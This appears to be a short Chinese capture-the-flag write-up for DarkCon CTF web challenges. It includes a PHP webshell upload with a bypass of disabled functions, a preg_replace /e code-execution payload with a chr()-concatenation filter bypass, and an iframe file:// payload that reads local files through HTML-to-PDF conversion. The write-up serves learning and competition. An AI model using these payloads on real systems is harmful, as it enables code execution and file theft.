@@ -1,0 +1,68 @@
+#DarkCon CTF
+前几天刷twitter 看到了DarkCon CTF
+我一个人刷了两道题 然后叫来了忍者师傅一起刷
+
+#WTF PHP
+Hint : flag in /etc
+打开是一个上传 没有任何限制 直接给出了源代码
+传一句话进去 phpinfo看了一下disable_function 
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcnt
+l_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,
+pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,
+pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigp
+rocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpri
+ority,pcntl_setpriority,pcntl_async_signals,error_log,link,symlink,s
+yslog,ld,mail,exec,passthru,shell_exec,system,proc_open,popen,curl_e
+xec,curl_multi_exec,parse_ini_file,show_source,highlight_file,file,f
+open,fread,var_dump,readfile
+var_dump被禁用了 用print_r 然后scandir没有禁用 直接scandir("/etc")拿到flag路径
+file_get_contents 读取
+
+#Easy PHP
+
+题目要求不允许爆破 然后我第一件事情就是爆破 发现 robots.txt
+打开内容是 ?lmao
+传参过去返回了源代码
+<?php
+require_once 'config.php';
+
+$text = "Welcome DarkCON CTF !!";
+
+if (isset($_GET['lmao'])) {
+	highlight_file(__FILE__);
+	exit;
+}
+else {
+	$payload = $_GET['bruh'];
+	if (isset($payload)) {
+		if (is_payload_danger($payload)) {
+			die("Amazing Goob JOb You :) ");
+		}
+		else {
+			echo preg_replace($_GET['nic3'], $payload, $text);
+		}
+	}
+	echo $text;
+}
+?>
+preg_replace的代码执行
+bruh=phpinfo()&nic3=/a/e
+成功执行
+然后就是绕过is_payload_danger
+直接用eval(chr().chr())这个方法去拼接就绕过了
+
+#darkcon-challs
+这道题是GraphQL一开始以为是类似于BugDB那几道题一样的考验你是不是有手和电脑 结果是graphql的SQL注入
+
+#Capture the MEME
+题目表述是 flag at /etc/flag.txt
+
+打开页面看到了一个小李子的MEME然后右边是一个可以输入URL的点 和meme text的输入点 就是一个表情包制作的功能 我一开始以为是SSRF 底下有一个导出功能 
+导出的是PDF格式
+我直接就想到了 Nahamsec 之前那个 PDF to RCE的分享
+https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent
+HTML Convert to PDF的一个漏洞
+payload
+<iframe src="file://etc/flag.txt" width="800px" height="600px"></iframe>
+
+简单的记录一下 后面的题目还都没做就到时间了
